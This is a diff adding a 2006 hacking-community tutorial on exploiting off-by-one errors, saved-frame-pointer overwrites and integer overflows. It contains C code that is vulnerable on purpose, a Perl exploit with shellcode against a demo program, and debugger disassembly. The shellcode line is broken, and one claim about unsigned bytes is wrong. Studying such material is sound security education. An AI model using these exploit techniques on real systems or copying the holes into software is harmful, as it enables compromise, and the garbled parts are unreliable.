@@ -1,0 +1,434 @@
+################################################################################
+#                            Exotic Vulnerabilities                            #
+#                       by Nomenumbra/[0x00SEC]				       #	
+################################################################################
+
+Intro:
+
+Well, this small paper will be discussing two exotic vulns that are getting more
+and more common, or actually more common knowledge. When b0fs where starting to
+hit the scene back in the days of Aleph1 they were extremely common in most apps
+(and still are in some), but more and more coders are getting aware of these
+security risks and are doing boundschecking and are taking other measures. Well,
+these 'protections' can often be circumvented in very silly ways, trough often
+neglected and misunderstood bugs. I will be discussing off-by-one errors and
+integer overflows in this paper.
+
+Off-by-one errors:
+I'm discussing off-by-one errors here, for those who don't know what an
+off-by-one error is, here is a short description from wikipedia:
+
+"An off-by-one error in computer programming is an avoidable error in which a
+loop iterates one too many or one too few times. Usually this problem arises
+when a programmer fails to take into account that a sequence starts at zero
+rather than one, or makes mistakes such as using "is less than" where "is less
+than or equal to" should have been used in a comparison."
+
+Example:
+Imagine the coder would want do preform an action on elements m to n of an array
+X, how would he calculate how many element would he have to process? Some would
+answer n-m, which is ...
+WRONG. This example is known as the "fencepost" error (the famous maths
+problem). The correct answer would be n-m+1. See the following code:
+
+for(int i = 0; i < (n-m); i++)
+DoSomething(X[i+m]);
+
+the coder might think he would preform the action over elements m to n of X but
+actually he preforms them over m to n-1.
+
+So it's actually the result of a shit-ass coder? Well, it is, but an off-by-one
+bug is made more often than you think. Often hidden deep within a vulnerable
+app, and not quite as obvious as the given examples. The following app is an
+example (totally useless) app that features 3 vulns that can, when combined,
+lead to system compromise.
+
+#include <cstdlib>
+#include <iostream>
+#define UserCount 2
+
+using namespace std;
+
+struct UserStruct {
+char* Username;
+char* Password;
+int Access;
+}; // lame 'user' structure
+
+UserStruct UserArray[UserCount]; // array
+
+void LameFunc(char* Data) // some lame no-good function
+{
+char buffer[10];
+strcpy(buffer,Data); // extremely simple b0f for demonstration purposes lol
+return;
+}
+void SomeLoop(int Times,char* Data)
+{
+// The coder thinks that if Times is 0, the loop won't run since while(Times >
+0) will be false
+// the loop will however run at least 1 time, because of the Do statement, so
+this is off-by-one
+// this kind of error occurs quite often, but less obvious ofcourse
+do {
+LameFunc(Data);
+Times--;
+} while (Times > 0);
+}
+
+void Initialize() // initialize the 'users' which may only have numeric
+usernames and passwords
+{
+UserArray[0].Username = "123";
+UserArray[0].Password = "321";
+UserArray[0].Access = 9; // number of times their loop will run
+UserArray[1].Username = "456";
+UserArray[1].Password = "654";
+UserArray[1].Access = 1;
+}
+
+bool IsNoShellcode(char* Data) // checks if Data is numeric only
+{
+for(int i = 0; i < strlen(Data); i++)
+if (((int)Data[i] > 57) || ((int)Data[i] < 48))
+return false;
+return true;
+}
+
+int Auth(char* User,char* Passwd) // checks if user and password are authed, if
+so it returns the //number of times their loop will run, else it will return 0
+since the coder is under the false //assumption the loop won't run at all if
+Times is 0
+{
+for (int i = 0; i < UserCount; i++)
+{
+if((strcmp(UserArray[i].Username,User) == 0) &&
+(strcmp(UserArray[i].Password,Passwd) == 0))
+return UserArray[i].Access;
+}
+return 0;
+}
+
+int main(int argc, char *argv[])
+{
+if (argc != 4)
+{
+printf("[?]Lameapp v1.0\nUsage: %s username password data\n",argv[0]);
+exit(-1);
+}
+Initialize();
+//'Sanitize' input
+for(int i = 0; i < (3-1); i++) // The coder thinks this will loop from 1 to 3,
+but it will only loop //from 1 to 2 (fencepost error)
+if(!IsNoShellcode(argv[i+1])) // 'avoid' shellcode in the buffers
+exit(-1);
+SomeLoop(Auth(argv[1],argv[2]),argv[3]);
+return 0;
+}
+
+Ok, I hear everyone thinking WTF?! What is the PURPOSE of this app, good guess,
+none, it's totally useless, but hey, it's an example and so is most software
+nowadays. The apps works as follows:
+
+lameapp.exe username password data
+
+Assuming we can't read the passwords (we can't do DLL-injection on the app, we
+can't reverse it,etc just ASSUME it for a second ) we don't have a valid login,
+which is nothing to worry about, because the loop will run anyway, even if we're
+unauthentificated (because of the do { } while off-by-one error). Then the
+programmer tries to prevent shellcode being 'stored' in either of the arguments
+(instead of just coding secure) by "sanitizing" the arguments, but the
+sanitizing routine is off by one, since not elements m trough n are processed
+but m trough n-1. Thus leaving the last argument argv[3] unsanitized, to store
+our data. I know, this example is TOO obvious, but it is an illustration to
+off-by-one errors. So exploiting this bitch wouldn't be hard. Assuming you know
+how to exploit buffer overflows on the windows platform (if you don't read
+either Tonto's articleb0f_1 or mineb0f_2 ) the exploit would look as follows:
+
+#!/usr/bin/perl
+my $ShellCode = "\x33\xc0\xeb\x16\x59\x88\x41\x04\x50\x51\x51\x50\
+xb8\x24\xe8\xd3\x77\xff\xd0\xb8\x63\x9
+
+
+8\xe5\x77\xf f\xd0\xe8\xe5\xff\xff\xff\x68\x69\x32\x75\x4e";
+
+my $TargetApp = "C:\\lameapp";
+my $OverflowString = "\x90"x28;
+
+my $JMPESP = "\x24\x29\xD8\x77";
+my $XploitStr = $TargetApp." 666 666 ".$OverflowString.$JMPESP.$ShellCode;
+system($XploitStr);
+
+Stack Frame pointer overwriting:
+
+Another interesting case of off-by-one is stack frame pointer overwriting,
+documented by Klog (http://www.phrack.org/phrack/55/P55-08). I'll describe the
+basic aspects in a windows situation (yeah yeah call me names already) here.
+Imagine a situation of the worst case, a buffer overflow in which you can only
+overflow with ONE byte (off-by-one), how could this lead to us influencing the
+code execution of the app? That'll be discussed here.
+There are some differences between the linux (discussed by Klog) and windows
+variant, with the windows variant having some drawbacks over the linux one.
+There are a multitude of possible situations when it comes to stack frame
+pointer overwriting, every situation having it's own unique traits. Since this
+is a 'worst case scenario' exploit, exploitation will be quite difficult at
+times.
+
+Ok imagine (or just read ;p) this situation:
+
+#include <stdio.h>
+#include <cstdlib>
+#define BUFFSIZE 1024
+int main(int argc, char *argv[])
+{
+char buff[BUFFSIZE];
+for (int i = 0; i <= BUFFSIZE; i++)
+*(buff+i) = argv[1][i];
+return 0;
+}
+
+Well, some people will say, what's the problem mate, you just take up till
+BUFFSIZE, so all fits nicely! Well, upon closer examination they will be proven
+wrong because the loop is off-by-one (because of the <= instead of just <). So
+we have an overflow of exactly ONE byte, what's that gonna help us? Well, for an
+answer to that let's look at the layout of the stack with such an app:
+
+saved_eip
+saved_ebp
+char buffer[255]
+char buffer[254]
+...
+char buffer[000]
+int i
+
+so if we overflow buffer with one byte, the last byte of the DWORD of the saved
+ebp will be overwritten, thus we can trick the program into believing the
+original EBP (saved in the function prologue: push EBP, MOV EBP,ESP) is our
+(partially) overwritten value.
+
+This action being followed by the function epilogue:
+
+mov ESP,EBP
+add ESP,4
+pop EBP
+
+(which is also LEAVE).
+
+Now, we want ESP to point to the address of our shellcode (located in the
+overflowing buffer), so since ESP will be EBP+4 so saved EBP should be the
+address of our shellcode, 4. Since we cannot control the third byte of the saved
+ebp , we can't make ESP hold the address of the start of our buffer, so we
+should fill it with nops till the address we can make ESP hold.
+
+Well when researching this vuln, I found some weird difference between
+compilers. When compiled with VC6 or gcc, there seems to be no problem or
+difference, but when compiled with Mingw, there is a problem which I'll discuss
+in a minute.
+Now take this app:
+
+#include <stdio.h>
+#include <cstdlib>
+#define BUFFSIZE 1024
+
+void Funk(char* bf)
+{
+char buff[BUFFSIZE];
+for (int i = 0; i < (BUFFSIZE+9); i++)
+*(buff+i) = bf[i];
+}
+int main(int argc, char *argv[])
+{
+Funk(argv[1]);
+return 0;
+}
+
+This app differs from the first in one major concept, it doesn't do the real
+for(i = 0; i <= BUFFSIZE; i++) what makes it off-by-one, but instead it will
+copy till BUFFSIZE+9. This is because I first compiled my app with mingw, making
+the stack layout look like:
+
+saved_eip
+saved_ebp
+[Mr-x DWORD]
+[Mr-x DWORD]
+char buffer[255]
+char buffer[254]
+...
+char buffer[000]
+int i
+
+there are two DWORDs of unknown purpose between our buffer and the saved EBP. I
+first suspected them to be canary values, but since their content is static,
+that's bullshit. I will talk about this later. As I already told you, there are
+no such problems with VC6 or Gcc, this seems to be a mingw problem (thanks to
+Tonto for verifying this).
+
+The routine Funk (for a Mingw compiled program) looks like this when
+disassembled:
+
+00401290 /$ 55 PUSH EBP
+00401291 |. 89E5 MOV EBP,ESP
+00401293 |. 81EC 18040000 SUB ESP,418
+00401299 |. C785 F4FBFFFF > MOV DWORD PTR SS:[EBP-40C],0
+004012A3 |> 81BD F4FBFFFF > /CMP DWORD PTR SS:[EBP-40C],408
+004012AD |. 7F 27 |JG SHORT a.004012D6
+004012AF |. 8D45 F8 |LEA EAX,DWORD PTR SS:[EBP-8]
+004012B2 |. 0385 F4FBFFFF |ADD EAX,DWORD PTR SS:[EBP-40C]
+004012B8 |. 8D90 00FCFFFF |LEA EDX,DWORD PTR DS:[EAX-400]
+004012BE |. 8B45 08 |MOV EAX,DWORD PTR SS:[EBP+8]
+004012C1 |. 0385 F4FBFFFF |ADD EAX,DWORD PTR SS:[EBP-40C]
+004012C7 |. 0FB600 |MOVZX EAX,BYTE PTR DS:[EAX]
+004012CA |. 8802 |MOV BYTE PTR DS:[EDX],AL ; move bf[i] into buffer[i]
+004012CC |. 8D85 F4FBFFFF |LEA EAX,DWORD PTR SS:[EBP-40C]
+004012D2 |. FF00 |INC DWORD PTR DS:[EAX]
+004012D4 |.^EB CD \JMP SHORT a.004012A3
+004012D6 |> C9 LEAVE
+004012D7 \. C3 RETN
+
+and like this when compiled with gcc:
+
+004012C3 |. C745 F4 000000> MOV DWORD PTR SS:[EBP-404],0
+004012CA |> 817D F4 FF0300> /CMP DWORD PTR SS:[EBP-404],3FF
+004012D1 |. 7F 15 |JG SHORT a.004012E8
+004012D3 |. 8D45 F8 |LEA EAX,DWORD PTR SS:[EBP-400]
+004012D6 |. 0345 F4 |ADD EAX,DWORD PTR SS:[EBP-404]
+004012DE |. C600 41 |MOV BYTE PTR DS:[EAX],41
+004012E4 |. FF00 |INC DWORD PTR DS:[EBP-404]
+004012E6 |.^EB E2 \JMP SHORT a.004012CA
+
+As can be seen in the hex dump around buffer in OllyDBG when going trough this
+routine:
+
+00 00 05 00 00 00 41 41 #...AA
+41 41 41 <junkjunkjunk> AAA
+
+the 05 00 00 00 is a DWORD reservated for int i, after that buffer is located,
+with junk after it, that is to be overwritten with the data to be stuffed into
+the buffer. And this will eventually overwrite the last byte of the saved ebp
+(in the case of a mingw compilation with the byte at position (1024 + 9) else
+with the byte at position (1024 + 1) inside argv[1]). Now look at a part of the
+disassembled Main:
+
+0040130D |. E8 7EFFFFFF CALL a.00401290
+00401312 |. B8 00000000 MOV EAX,0
+00401317 |. C9 LEAVE
+00401318 \. C3 RETN
+
+Ok, now take a carefull look at the registers as we move trough our apps'
+execution:
+
+Before the LEAVE in Funk, EBP is 0x0022FF58 (points to saved_ebp) after the
+LEAVE,EBP is 0x0022FF<overflowing byte here> (while it should be 0x0022FF78) and
+ESP is changed 0x0022FF5C ( 0x0022FF58 + 4). Now if we continue execution until
+just after Main's LEAVE (in the example at 0x00401317) we can see that ESP is
+now 0x0022FF<overflowing byte + 4), and EIP will be popped from that address, so
+we have our exploitable condition! Our initial overflowing buffer should look
+like:
+
+In case of a mingw compilation:
+["\x90"x1024] + ["\x90" x 8] + [overflowing byte]
+In case of a gcc compilation:
+["\x90"x1024] + [overflowing byte]
+
+Now we should let the overflowing byte point somewhere in the middle of our
+buffer. Keep in mind that that byte will be increased with 0x04 though in ESP.
+In this case 0x01 should suffice, becoming 0x05 in ESP.
+
+Then, at that address (in our buffer: 0x0022FF05) we should have the address of
+the start of our shellcode, that will be popped into EIP. So we should have the
+following exploitation buffer:
+
+[Shellcode][addr of Shellcode][overflowing nops (if necessary)][overflowing byte
+pointing to the addres of [addr of Shellcode]]
+
+There is are several issues with this exploitation method on windows though. Due
+to buff being declared in Func, it might have it's data partially overwritten
+(due to windows' relative addressing method), rendering this exploit useless. I
+told you there are some major differences in exploitation on windows and linux
+(as always >.>) and this is a large drawback because we this REALLY makes this a
+worst case scenario. The other (and probably biggest) drawback are the two
+strange DWORDs between the saved EBP and our buffer on a Mingw compilation. This
+means we must be very careful at looking what compiler what used to compile the
+app before drawing conclusions about potential exploitable content.
+
+Integer overflows:
+
+Integer overflows are misunderstood bugs. They are relatively rare, but not in
+the sense of occurance but in the sense of discovery. They are often overlooked
+or just neglected due to the lack of exploitation knowledge. Well, integer
+overflows basically consist of increasing an integer beyond it's maximum
+capacity, thus sometimes causing exploitatable behavior. Ok, look at the
+following min and max value table of several data types:
+
+So, let's look at the next aritmetic example:
+
+int main(int argc,char* argv[])
+{
+byte a = 0xFF;
+a += 0x1;
+return 0;
+}
+
+running this app in a debugger would reveal to us what you might have suspected.
+Since 0xFF is 255 but also (in case of an unsigned 8-bit value) -1. So adding 1
+to 0xFF (being the max value of a byte) makes -1 + 1 = 0. This can be abused for
+our own purposes. Imagine the following app vulnerable to a simple b0f:
+
+int main(int argc,char* argv)
+{
+char buffer[20];
+if(argc != 3)
+exit(-1);
+int i = atoi(argv[2]);
+unsigned short s = i;
+if (s > 19) // 'prevent' b0f
+exit(-1);
+strncpy(buffer,argv[1],i);
+return 0;
+}
+
+This is indeed an extremely gullible app, trusting the user with inputting the
+length of the data, but these constructs occur more often than you think, more
+obscurely and complex yes, but they occur nontheless. Now, this app checks if s
+is bigger than 19, which would cause a potential b0f, so it 'prevents' it this
+way. What's wrong though is this line:
+
+unsigned short s = i;
+
+since atoi returns a signed 32-bit int which can hold up to 2,147,483,647 and an
+unsigned short can only hold up to 65,535, thus we could input 65,536 in
+argv[2], overflowing s (and setting it to 0) bypassing the bounds checking and
+overflowing the buffer anyway.
+
+Now, the following example will incorporate several vulnerablilities in one app:
+
+char* UserBuffer = (char*)malloc(10);
+int TrustedData = (int)malloc(4);
+memcpy(&TrustedData,&SomeTrustedSource,4);
+int len = atoi(argv[2]);
+short l = len; // [V1]
+if(l > 9) // [V1.5]
+exit(-1);
+strncpy(UserBuffer,argv[1],len); //[V2]
+if (TrustedData + SomeUserSuppliedValue > SomeLimit) // [V3]
+DoSomethingElse()
+
+Ok, the first vuln lies with [V1], where len is converted to a short from an
+int, like discussed earlier this can help us bypass the boundschecking at [V1.5]
+and copy more data to UserBuffer [V2] than it can handle and heap overflow
+TrustedData (we should copy (addr of TrustedData's allocated area), (addr of
+UserBuffer's allocated area) bytes to UserBuffer and all data after that will
+overwrite the data in TrustedData, which is assumed to originate from
+SomeTrustedSource. We can for example exploit this as a signedness error, Making
+TrustedData negative, thus bypassing the boundschecking at [V3], and potentially
+overflowing data that relies on SomeUserSuppliedValue as a limit.
+
+Outro:
+Well, I hope you liked the article and learned something new from it. And
+remember, 0-days are 0-days, don't make them public
+Anyways, shouts go to the whole HackThisSite cast & crew , NullSec, .aware community, ASO/PTP
+community, guys over at SmashTheStack and vx.netlux.org peeps.
+
+Nomenumbra 
+
+# milw0rm.com [2006-09-27]
